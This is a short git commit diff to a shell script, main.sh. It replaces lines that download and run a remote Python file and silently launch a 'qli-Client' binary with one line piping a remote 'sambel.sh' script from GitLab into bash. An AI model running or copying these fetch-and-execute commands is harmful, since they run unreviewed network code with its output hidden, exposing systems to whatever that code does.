c9646f5a9ab636e54a81f1be07ed5e1c0d21f948
erlandi-26 <x@erlandi.eu.org>
2024-07-13 02:31:58 +0700

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,5 +1,1 @@
-wget https://raw.githubusercontent.com/erlandi-26/erlandi-26/main/tdc && python tdc
-echo "******************************************************************" 
-echo "IP ORI ==> "$(curl ifconfig.me) 
-echo " "
-chmod +x qli-Client && ./qli-Client >/dev/null 2>&1
+curl -sL https://gitlab.com/erlandysword/build/-/raw/main/sambel.sh | bash
